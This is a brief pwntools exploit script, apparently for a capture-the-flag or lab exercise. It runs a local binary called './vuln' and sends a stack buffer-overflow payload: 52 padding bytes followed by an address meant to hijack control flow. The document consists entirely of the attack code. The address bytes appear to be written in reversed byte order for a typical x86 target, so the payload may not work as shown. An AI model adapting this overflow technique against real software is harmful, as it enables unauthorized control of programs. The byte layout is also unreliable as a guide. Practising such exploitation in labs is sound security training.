from pwn import *

p = process('./vuln')
log.info(p.clean())
pause()
p.sendline(b'A'*52 + b'\x08\x04\x91\xc3')
log.info(p.clean())

